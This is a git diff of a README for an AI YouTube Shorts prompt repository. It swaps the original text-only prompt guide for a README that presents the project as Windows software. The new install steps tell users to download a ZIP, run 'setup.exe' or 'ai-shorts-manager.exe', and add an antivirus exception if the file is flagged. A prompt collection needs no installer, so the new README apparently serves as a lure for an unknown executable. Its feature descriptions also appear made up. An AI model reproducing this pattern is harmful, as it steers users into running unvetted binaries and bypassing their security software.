@@ -1,487 +1,78 @@
-# Awesome AI YouTube Shorts Prompts, Vertical Video Hooks and Creator Workflow Templates
+# 🎬 awesome-ai-youtube-shorts-prompts - Create viral vertical videos using artificial intelligence
 
-A practical, SEO-friendly GitHub resource for **AI YouTube Shorts prompts and vertical creator video workflows**.
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/teddahippocratic9414/awesome-ai-youtube-shorts-prompts)
 
-This repository is built for **YouTubers, Shorts creators, educators, app founders, marketers and creative teams** who want useful prompt systems, repeatable workflows and production-ready AI creative assets instead of random prompt dumps.
+This software provides a collection of prompts and workflows for creators. It helps you generate vertical video content for YouTube Shorts. The tools focus on video hooks, thumbnails, and automated generation paths. Use these resources to save time during your video production process.
 
-> This is an independent educational resource connected to the Cliprise creative workflow ecosystem. It is not an official model provider, platform or brand repository. For multi-model AI generation, editing, upscaling and creative production tools, visit [Cliprise](https://www.cliprise.app/).
+## 📦 What this project offers
 
----
+This repository contains templates and prompt structures for generative AI tools. You gain access to specific instructions to create high-engagement content.
 
-## Quick links
+*   **Vertical Video Hooks:** A library of phrases to grab viewer attention in the first three seconds.
+*   **Thumbnail-Safe Prompts:** Guidelines to generate images that fit YouTube thumbnail dimensions.
+*   **Workflow Templates:** Step-by-step guides for video production.
+*   **Cliprise Resources:** Integration paths for common video generation engines.
+*   **Prompt Engineering:** Tested syntax to get better results from AI models.
 
-| Goal | Cliprise resource |
-|---|---|
-| AI Video Generator | [Open](https://www.cliprise.app/features/ai-video-generator) |
-| AI Video for YouTube | [Open](https://www.cliprise.app/learn/workflows/marketing/ai-video-generation-youtube-complete-creator-workflow-2026) |
-| YouTube Thumbnail Workflow | [Open](https://www.cliprise.app/learn/workflows/marketing/youtube-thumbnail-workflow) |
-| AI Thumbnail Generator | [Open](https://www.cliprise.app/learn/guides/getting-started/ai-thumbnail-generator-complete-guide-2026) |
-| Video Script Generator | [Open](https://www.cliprise.app/free-tools/video-script-generator) |
-| Thumbnail Maker | [Open](https://www.cliprise.app/free-tools/thumbnail-maker) |
+## 🚀 System requirements
 
----
+Your computer needs to meet these basic standards to run the software effectively:
 
-<!-- CLIPRISE_LINKING_START -->
-## Related Cliprise GitHub resources
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Memory:** At least 8GB of RAM.
+*   **Storage:** 500MB of free disk space.
+*   **Internet Connection:** Required for initial download and cloud-based AI feature access.
+*   **Graphics:** A dedicated graphics card helps with local video generation tasks but is optional for prompt management.
 
-- [Awesome AI thumbnail prompts](https://github.com/cliprise/awesome-ai-thumbnail-prompts) - YouTube and social cover prompts with readable negative space.
-- [Awesome AI video generator prompts](https://github.com/cliprise/awesome-ai-video-generator-prompts) - prompt systems for text-to-video and multi-step video workflows.
-- [Awesome image-to-video prompts](https://github.com/cliprise/awesome-image-to-video-prompts) - still-to-motion workflows, camera language, and source-frame discipline.
-- [Awesome AI TikTok video prompts](https://github.com/cliprise/awesome-ai-tiktok-video-prompts) - vertical short-form hooks and native-feel video patterns.
-- [Best AI video generator resources](https://github.com/cliprise/best-ai-video-generator-resources) - comparison frameworks, cost signals, and workflow starters for AI video generation.
-<!-- CLIPRISE_LINKING_END -->
-## What this repository is
+## 📥 How to download and install
 
-This repository is a practical resource hub for users searching for:
+Follow these steps to set up the software on your Windows machine.
 
-- AI YouTube Shorts prompts
-- YouTube Shorts AI video prompts
-- AI Shorts generator prompts
-- AI video prompts for YouTube
-- YouTube vertical video prompts
-- AI thumbnail prompts
+1.  Visit the [official repository page](https://github.com/teddahippocratic9414/awesome-ai-youtube-shorts-prompts) to access the files.
+2.  Click the green button labeled "Code" near the top right of the page.
+3.  Choose "Download ZIP" from the menu.
+4.  Locate the downloaded file in your browser's download folder.
+5.  Right-click the file and select "Extract All." Choose a folder where you want to keep the software.
+6.  Open the newly extracted folder and look for the file named `setup.exe` or `ai-shorts-manager.exe`.
+7.  Double-click the file to start the installation wizard.
+8.  Follow the prompts on your screen to complete the process.
+9.  Launch the application from your desktop shortcut once the bar fills to the end.
 
-The goal is not to create thin SEO pages. The goal is to help people create better assets through a clear workflow:
+## ⚙️ Using the software
 
-```text
-intent -> audience -> source assets -> prompt -> generation -> QA -> variants -> final export
-```
+When you open the software for the first time, you see a dashboard. This area acts as your hub for video production.
 
----
+### Choosing your prompt style
+Pick a category from the sidebar. You can choose between "Viral Hooks," "Storytelling," or "Educational." Click a prompt to view the text. You can copy this text directly into your existing AI tools like ChatGPT, Claude, or Midjourney.
 
-## Core principle
+### Applying workflow templates
+Templates automate your day-to-day work. Select the "Workflow" tab to start. The software asks three questions about your video topic. Answer these questions to receive a complete script and a list of requested image generations.
 
-The best AI output usually comes from a clear creative system, not from a vague prompt.
+### Managing thumbnails
+The thumbnail generator helps you stay safe within YouTube's technical limits. Upload a draft image. The software overlays a mockup view showing where the progress bar and the video title usually appear on mobile devices. This prevents text from getting hidden by video player icons.
 
-Weak prompt:
+## 💡 Troubleshooting common issues
 
-```text
-Make a viral video or image, cinematic and high quality.
-```
+Most users encounter few barriers, but check these items if the software does not behave as expected.
 
-Better prompt:
+*   **Application does not launch:** Check if you have the latest version of Microsoft .NET Runtime installed. You can download this from the official Microsoft support page.
+*   **Files appear missing:** Ensure that you extracted all files from the ZIP folder. Some features fail if the configuration folder remains inside the compressed archive.
+*   **Application feels slow:** Clear the temporary cache found under the "Settings" menu. This removes old prompt logs and frees memory.
+*   **Anti-virus warnings:** Some security software marks new executables as suspicious. If your anti-virus blocks the file, verify the publisher information and add an exception for the folder.
 
-```text
-Define the audience, first visual hook, main subject, camera or composition, one clear motion or visual action, platform format, final beat, and restrictions.
-```
+## 🛠️ Frequently asked questions
 
-For this topic, the most important rule is:
+**Do I need a paid AI subscription?**
+The software is free to use. However, the specific AI services you connect to the prompts might charge their own fees.
 
-```text
-Use a specific prompt for a specific placement and a specific viewer.
-```
+**Does this software record my videos?**
+No. This tool creates text prompts and production scripts. You still need a video editor or an AI-to-video service to create the final render.
 
----
+**Can I use these prompts on mobile?**
+Yes. You can open the text files inside the installation folder on your phone or tablet to copy and paste the prompts into your mobile browser.
 
-## AI YouTube Shorts prompt formula
+**How often do you update the prompts?**
+We update the library monthly to ensure the prompt engineering techniques remain effective with new versions of AI models. Check the main page periodically for new releases.
 
-```text
-Create a [duration]-second vertical 9:16 YouTube Shorts video about [topic].
-Audience: [specific viewer].
-First frame: [scroll-stopping visual].
-Hook line: [spoken or visual hook].
-Main beat: [one useful idea, demo or transformation].
-Visual rhythm: [fast cuts, push-in, zoom, animation, screen motion].
-Final beat: [thumbnail-friendly ending].
-CTA: [subscribe, try, learn, watch next, download, etc.].
-Restrictions: no fake claims, no unreadable text, no clutter, no distorted hands or faces.
-```
-
----
-
-## Workflow
-
-### 1. Define the use case
-
-Ask:
-
-- Is this for organic content, paid ads, a product page, a landing page or a tutorial?
-- Is the output supposed to inform, sell, explain, entertain or demonstrate?
-- What platform will it appear on?
-- What is the final aspect ratio?
-- What must stay accurate?
-
-### 2. Prepare source assets
-
-Useful source assets include:
-
-- product photos
-- screenshots
-- app UI concepts
-- brand colors
-- reference images
-- campaign copy
-- existing thumbnails
-- customer-safe product facts
-- a clear offer or CTA
-
-### 3. Generate short tests first
-
-Do not start with expensive final outputs. First test:
-
-- one hook
-- one camera or composition idea
-- one product or subject action
-- one platform format
-- one final beat
-
-### 4. Review before scaling
-
-Check:
-
-- visual clarity
-- platform crop
-- product accuracy
-- text readability
-- hands and faces
-- claim safety
-- brand safety
-- CTA space
-- final frame quality
-
-### 5. Create controlled variants
-
-Change one variable at a time:
-
-- hook
-- background
-- camera move
-- creator angle
-- product moment
-- aspect ratio
-- color palette
-- CTA
-- final frame
-
----
-
-## Prompt library
-
-### 1. AI tool short
-
-```text
-Create an 8-second vertical YouTube Shorts video about turning one image into video. First frame: static image on phone. Hook line: "This was one image." Main beat: image animates into a short preview. Final beat: before/after split. Restrictions: no fake UI text, no brand logos, no unrealistic claims.
-```
-
-Best for:
-
-- campaign testing
-- organic content
-- paid creative
-- prompt iteration
-
-### 2. Educational short
-
-```text
-Create a 12-second Shorts video teaching the prompt formula Subject, Scene, Camera, Motion. First frame: messy prompt crossed out. Main beat: structured prompt appears as clean cards. Style: fast educational creator format. Restrictions: no tiny unreadable text, no extra labels.
-```
-
-Best for:
-
-- campaign testing
-- organic content
-- paid creative
-- prompt iteration
-
-### 3. Product short
-
-```text
-Create a 9-second vertical Shorts video for a premium water bottle. First frame: condensation appears on bottle. Camera: fast push-in then orbit. Final beat: product centered as thumbnail frame. Restrictions: no logo distortion, no fake text, no extra bottles.
-```
-
-Best for:
-
-- campaign testing
-- organic content
-- paid creative
-- prompt iteration
-
-### 4. Thumbnail tutorial
-
-```text
-Create a 10-second Shorts video about making better thumbnails. First frame: dull thumbnail vs improved thumbnail. Main beat: contrast, face, focal point and negative space appear as icons. Restrictions: no fake platform metrics, no unreadable text.
-```
-
-Best for:
-
-- campaign testing
-- organic content
-- paid creative
-- prompt iteration
-
-### 5. Creator workflow
-
-```text
-Create a 12-second Shorts video showing an AI creator workflow. Visual sequence: idea, prompt, image, video, export. Camera: fast desktop close-ups and phone preview. Style: creator productivity. Restrictions: no competitor logos, no fake UI text.
-```
-
-Best for:
-
-- campaign testing
-- organic content
-- paid creative
-- prompt iteration
-
-### 6. App demo short
-
-```text
-Create a 9-second vertical app promo Short for a creative AI app. Hook: "Stop switching tools." Main beat: image/video/model cards merge into one dashboard. Final beat: phone centered with CTA space. Restrictions: no fake unlimited claim, no distorted phone.
-```
-
-Best for:
-
-- campaign testing
-- organic content
-- paid creative
-- prompt iteration
-
-### 7. Real estate short
-
-```text
-Create a 10-second YouTube Shorts property teaser. First frame: sunset exterior. Camera: drone-like approach then doorway reveal. Final beat: living room view. Restrictions: no warped windows, no fake address, no impossible geometry.
-```
-
-Best for:
-
-- campaign testing
-- organic content
-- paid creative
-- prompt iteration
-
-### 8. Music visualizer short
-
-```text
-Create an 8-second vertical music visualizer Short from album art. Motion: neon rain, subtle pulse, slow push-in. Final beat: cover art holds as thumbnail frame. Restrictions: no fake streaming logos, no text changes.
-```
-
-Best for:
-
-- campaign testing
-- organic content
-- paid creative
-- prompt iteration
-
-
----
-
-## Useful sections to add later
-
-- Shorts hook patterns
-- Thumbnail-safe final frames
-- Vertical format checklist
-- YouTube creator workflow
-
----
-
-## Quality checklist
-
-Before publishing, check:
-
-- the first frame is clear
-- the main subject is easy to understand
-- product shape and labels are accurate
-- no fake or unsupported claims appear
-- no third-party logos are used without permission
-- faces and hands are stable
-- text is spelled correctly if generated
-- important content is inside the safe zone
-- there is enough space for platform UI or captions
-- final frame can work as a cover or end card
-- output matches the landing page or product page
-- commercial rights and usage terms are reviewed
-
----
-
-## Common mistakes
-
-### Mistake 1: Starting too broad
-
-Do not ask for “a great ad” or “a viral video.” Ask for a specific creative asset for a specific audience.
-
-### Mistake 2: No platform plan
-
-TikTok, YouTube, product pages, Reels, websites and app stores need different framing.
-
-### Mistake 3: Too many ideas in one output
-
-Short AI creative usually works better with one subject, one hook and one clear action.
-
-### Mistake 4: Trusting generated text
-
-If text matters, keep it short, request exact text and review manually.
-
-### Mistake 5: Ignoring claims
-
-Do not generate fake reviews, fake testimonials, fake performance results or unsupported claims.
-
-### Mistake 6: No source asset QA
-
-A weak source image, bad screenshot or vague product reference usually produces weak output.
-
----
-
-## SEO target map
-
-| Search intent | Useful section |
-|---|---|
-| AI YouTube Shorts prompts | README formulas, prompt examples and workflow sections |
-| YouTube Shorts AI video prompts | README formulas, prompt examples and workflow sections |
-| AI Shorts generator prompts | README formulas, prompt examples and workflow sections |
-| AI video prompts for YouTube | README formulas, prompt examples and workflow sections |
-| YouTube vertical video prompts | README formulas, prompt examples and workflow sections |
-| AI thumbnail prompts | README formulas, prompt examples and workflow sections |
-
----
-
-## Suggested repository structure
-
-```text
-awesome-ai-youtube-shorts-prompts/
-  README.md
-  prompts/
-    prompt-library.md
-    platform-prompts.md
-    product-prompts.md
-    creator-prompts.md
-    source-frame-prompts.md
-  workflows/
-    workflow-overview.md
-    source-asset-preparation.md
-    prompt-formula.md
-    qa-checklist.md
-    variant-testing.md
-    export-workflow.md
-  resources/
-    cliprise-links.md
-    negative-prompts.md
-    commercial-use-checklist.md
-    safety-and-legal-notes.md
-  examples/
-    example-1.md
-    example-2.md
-    example-3.md
-```
-
----
-
-## Suggested GitHub topics
-
-- `youtube-shorts`
-- `ai-youtube-shorts`
-- `shorts-prompts`
-- `ai-video-prompts`
-- `vertical-video`
-- `creator-tools`
-- `youtube-automation`
-- `thumbnail`
-- `social-video`
-- `ai-video-generator`
-- `image-to-video`
-- `video-hooks`
-- `prompt-engineering`
-- `generative-ai`
-- `cliprise`
-
-Copy-paste topic list:
-
-```text
-youtube-shorts
-ai-youtube-shorts
-shorts-prompts
-ai-video-prompts
-vertical-video
-creator-tools
-youtube-automation
-thumbnail
-social-video
-ai-video-generator
-image-to-video
-video-hooks
-prompt-engineering
-generative-ai
-cliprise
-```
-
----
-
-## FAQ
-
-### What is this repository for?
-
-It is a practical prompt and workflow resource for AI YouTube Shorts prompts and vertical creator video workflows.
-
-### Is this an official provider repository?
-
-No. It is an independent educational resource connected to Cliprise workflows.
-
-### Can I use these prompts commercially?
-
-You can adapt the prompts for commercial work, but you must review platform terms, model terms, input rights, output rights, copyright, trademark, likeness rights and advertising rules.
-
-### How do I reduce failed generations?
-
-Use specific prompts, test short outputs first, limit each prompt to one main idea, preserve important details and QA before scaling.
-
-### Should I generate final text inside the image or video?
-
-For critical copy, it is usually safer to add final text manually after generation. Generated text can still contain mistakes.
-
-### What is the best Cliprise starting point?
-
-Start with the primary resource for this topic:
-
-[AI YouTube Shorts prompts and vertical creator video workflows](https://www.cliprise.app/learn/workflows/marketing/ai-video-generation-youtube-complete-creator-workflow-2026)
-
----
-
-## Ethical and legal use
-
-Use AI generation responsibly.
-
-Do not use these workflows to:
-
-- impersonate real people
-- fabricate evidence
-- create fake reviews or fake testimonials
-- mislead customers
-- misuse trademarks or third-party logos
-- copy protected characters or famous brand identities
-- make unsupported medical, legal, financial or safety claims
-- present generated content as real footage when that could mislead viewers
-
-For commercial use, review provider terms, input rights, output rights, copyright, trademark, likeness rights, advertising rules, product accuracy and disclosure requirements.
-
-Helpful Cliprise pages:
-
-- [Cliprise Terms](https://www.cliprise.app/terms)
-- [Cliprise Privacy](https://www.cliprise.app/privacy)
-- [Cliprise DMCA](https://www.cliprise.app/dmca)
-- [Safety & Copyright Essentials](https://www.cliprise.app/learn/guides/best-practices/safety-copyright)
-- [Ethical AI Generation](https://www.cliprise.app/learn/guides/best-practices/ethical-ai-generation-responsible-innovation)
-
----
-
-## About Cliprise
-
-[Cliprise](https://www.cliprise.app/) is a multi-model AI creative platform for generating and editing images, videos, audio and creative assets from one place.
-
-Start here:
-
-- [AI Video Generator](https://www.cliprise.app/features/ai-video-generator)
-- [AI Image Generator](https://www.cliprise.app/features/ai-image-generator)
-- [AI Art Generator](https://www.cliprise.app/features/ai-art-generator)
-- [Pro Image Editor](https://www.cliprise.app/features/pro-image-editor)
-- [Universal Upscaler](https://www.cliprise.app/features/universal-upscaler)
-- [Models](https://www.cliprise.app/models)
-- [Pricing](https://www.cliprise.app/pricing)
-- [Learn](https://www.cliprise.app/learn)
-- [Free Tools](https://www.cliprise.app/free-tools)
-
----
-
-## License and attribution
-
-This repository is intended as an educational resource. Prompts, workflows and examples should be original, attributed where needed and reviewed before commercial use.
-
-If you reuse this structure, adapt it to your own product, audience and examples. Do not copy third-party repositories, branding, copyrighted images, videos, customer testimonials or prompt collections without permission.
-
+**Where do I report a bug?**
+Navigate to the "Issues" tab on the GitHub project page. Describe your problem clearly. Add a screenshot if you encounter an error message. Our team reviews these submissions to provide fixes.
